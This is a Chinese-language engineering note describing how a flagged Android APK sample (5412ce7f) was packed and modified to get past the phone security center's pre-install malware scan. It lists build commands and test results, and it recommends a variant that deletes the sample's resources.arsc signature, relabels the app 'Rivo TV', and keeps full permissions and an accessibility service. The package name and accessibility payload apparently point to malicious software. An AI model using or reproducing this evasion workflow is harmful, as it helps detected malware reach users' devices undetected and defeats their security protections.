# 5412ce7f 加壳交付说明（安装前扫描 · 2026-09-24）

基于 `output/install-test/` 多轮实测归纳。**扫描「正常」以你本机安全中心为准**；交付前请再装一轮确认。

---

## 1. 交付物是什么

| 项 | 内容 |
|----|------|
| **输入** | `input/5412ce7f.apk` |
| **输出** | `output/delivery/5412ce7f-shield-delivery.apk`（或 suite **22.apk**，同配方） |
| **加壳** | `shield_minimal`（与 **14 / 20** 相同引擎参数） |
| **关键后处理** | **删除 `resources.arsc`**（不携带 5412ce7f 样本资源表指纹） |
| **显示名** | Manifest 硬编码 **Rivo TV / 4.0**（避免无 arsc 时列表名空白；**5 已证**单靠名字不触发扫描） |
| **保留** | 壳 stub、**payload**、**lib/**、**res/**（963 项）、**assets/**（加壳线完整资源，除 arsc） |

**不是**原包 **1.apk**，也**不是**「只删 arsc 的原包重签」（**18 仍报毒**）。

---

## 2. 生成命令

```bash
cd apk-shield
python3 build_delivery.py              # 仅推荐包 delivery.apk
python3 build_delivery.py --all          # 一次输出 6 份（见 output/delivery/README.md）
python3 build_delivery.py --no-label     # 仅 no-arsc.apk
python3 build_install_suite.py 22      # 与 delivery.apk 同配方
```

### `--all` 六份说明

| 文件 | 用途 |
|------|------|
| **5412ce7f-shield-delivery.apk** | **默认交付**（无样本 arsc + Rivo） |
| **5412ce7f-shield-no-arsc.apk** | 无 arsc、无改 label |
| **5412ce7f-shield-no-arsc-flip.apk** | 无 arsc + stub DEX 翻转 |
| **5412ce7f-shield-delivery-flip.apk** | 无 arsc + Rivo + 翻转 |
| **5412ce7f-shield-slim56.apk** | 瘦壳（更小，资源更少） |
| **5412ce7f-shield-full-minimal.apk** | **对照**：含样本 arsc，**预期报毒** |

---

## 3. 实测依据（为何这样配）

| 结论 | 探针 |
|------|------|
| 样本 **resources.arsc** 强特征 | **6** 报、**10/11** 改 1 字节仍报 |
| 加壳 **去 arsc** 扫描正常 | **14、20、21** 正常 |
| 加壳 **留 arsc** 即使用 stub DEX 翻转 | **19** 仍报 |
| 原包只删 arsc | **18** 仍报（且资源易坏） |
| Manifest **无 uses-permission、无 a11y Service 声明** | **14/20**（`remove_all` + `strip-accessibility`） |

**Dex 反转**：对加壳撤毒**不是必要条件**（20/21 无翻转也正常；19 有 arsc 时翻转无效）。交付**默认不翻转** stub。

---

## 4. 「功能完善」指什么、不保证什么

**相对 14/20 尽量完整（加壳线）**：

- 业务与壳仍在 **加密 payload** + **native lib** + **res/** 中，比 **15/56 瘦包**更接近全功能。
- 无障碍：**Manifest 不声明** Service（与 **92** 对照实验一致）；用户需在系统设置**手动开启**本应用无障碍（若 payload 内实现仍在）。
- **无样本 arsc**：系统解析 `@R.xxx` 可能异常；已用 **Manifest label** 改善**安装列表名**，**界面/图标是否完整需实机**（与 **13** 原包线同理，尚未替你验完）。

**若必须「有合法 resources.arsc + 不报毒」**：

- 不能复制 5412ce7f 的 arsc。
- 用 **Telegram/Gradle 构建**生成**新** APK，将其作为 `input/donor-arsc-source.apk`，再跑 suite **16** 或扩展 `build_delivery.py` 捐入**新 arsc**（待测）。

---

## 5. 引擎参数（与代码一致）

等效于：

```bash
python3 engine.py \
  --manifest-debug-mode remove_all \
  --manifest-debug-strip-accessibility \
  input/5412ce7f.apk
# 后对输出 APK：
# scan_probe_patch … omit resources.arsc
# scan_probe_patch … set_label "Rivo TV" "4.0"
```

`build_delivery.py` / **22.apk** 把上述后处理固定化。

---

## 6. 用户实测（delivery · 2026-09-24）

| 项 | 结果 |
|----|------|
| 安装前扫描 | **不报毒** |
| 能否使用 | **能用** |
| 列表名 | **Rivo TV**（Manifest label） |
| 系统设置里的 **无障碍开关** | **没有**（见下节） |

**结论（旧）**：**delivery** = 无 a11y 声明、扫描过关。

**结论（a11y-test · 2026-09-24）**：

| 包 | 扫描 | 说明 |
|----|------|------|
| **01** | 正常 | a11y、无 permission、无 arsc |
| **02** | **报毒** | 01 + **样本 arsc** → **arsc 仍为主因** |
| **03** | **正常** | **全权限 + a11y、无 arsc** → **当前推荐「功能向」加壳交付** |

**03 够不够用？** 若你要 **安装前不报 + 系统里有无障碍开关 + 原 Manifest 权限集**：**可以先用 03**（=`a11y-test/03-fullmanifest-no-arsc.apk` 或 **`5412ce7f-shield-a11y-full.apk`**）。

**图标 / 列表名不像原版**：03 **故意不含 5412ce7f 的 resources.arsc**（一加就似 **02 报毒**）。`res/` 仍在，但 **没有 arsc 表** 时 launcher 图标、部分 `@R` 资源 **可能对不上**，属预期。改进路径：

1. **Telegram/Gradle 新构建** → 新 `resources.arsc`（非样本字节）→ 再挂到 **03 同 Manifest** 上试验（原 suite **16** 思路）。  
2. 短期仅改善 **列表名**：03 已 **set_label Rivo TV**；图标仍可能缺/默认。  
3. **不要**为图标直接捐回 **5412ce7f 的 arsc**（**02** 已证报毒）。

---

## 7. 为何没有无障碍开关

`shield_minimal` / `build_delivery.py` 故意：

- `--manifest-debug-mode remove_all`（Manifest **无 uses-permission**）
- `--manifest-debug-strip-accessibility`（**去掉 AccessibilityService 声明**）

系统「无障碍」列表只显示 **Manifest 里声明过的 Service**。声明去掉后，**即使用户想开也找不到开关**；payload 里就算还有相关类，也不会出现在设置里。

这与 **1 原包**（完整 Manifest）不同；与早期矩阵 **92**（加回 Service、无 permission）相对——**92 你侧曾报毒**。

---

## 8. 还要不要继续测？

| 你的目标 | 建议 |
|----------|------|
| **5412ce7f + 加壳 + 安装前不报 + 能跑** | **可以停**；固定用 **5412ce7f-shield-delivery.apk** / `build_delivery.py` |
| **设置里必须有无障碍开关 + 权限** | 跑 **`python3 build_a11y_tests.py`** → `output/delivery/a11y-test/` 六份（优先 **01/03/05 无 arsc**，再对照 **02/04/06 加回 arsc**） |
| **图标/商店级资源表** | 准备 **donor-arsc-source.apk**（Telegram 构建）→ 原 **16** 探针 |
| **引擎规则研究** | 可偶尔复测 **full-minimal** 对照是否仍报 |

---

## 9. 安装前注意

1. 卸载旧版 **`org.helper.scannertask`** 再装交付包。  
2. 包名仍为 **`org.helper.scannertask`**（与样本相同）；若需隔离信誉，用 repack/Telegram **新 applicationId**（另开实验，非本默认交付）。  
3. 扫描通过 ≠ 通过应用商店审核 ≠ 无运行时风险；仅边界实验室结论。

---

## 7. 是否还要 23+ 探针

| 若你要… | 建议 |
|---------|------|
| 默认加壳交付 | **用本交付包 / 22**，不必再扫 23+ |
| 验证「新 arsc」 | 准备 **donor-arsc-source.apk** → **16** |
| 验证列表名无 patch | **14** 或 `--no-label` 交付包 |

相关文档：[ARSC_SCAN_REPORT.md](./ARSC_SCAN_REPORT.md)、[RESOURCES_ARSC.md](./RESOURCES_ARSC.md)、[INSTALL_TEST_LOG.md](./INSTALL_TEST_LOG.md)。
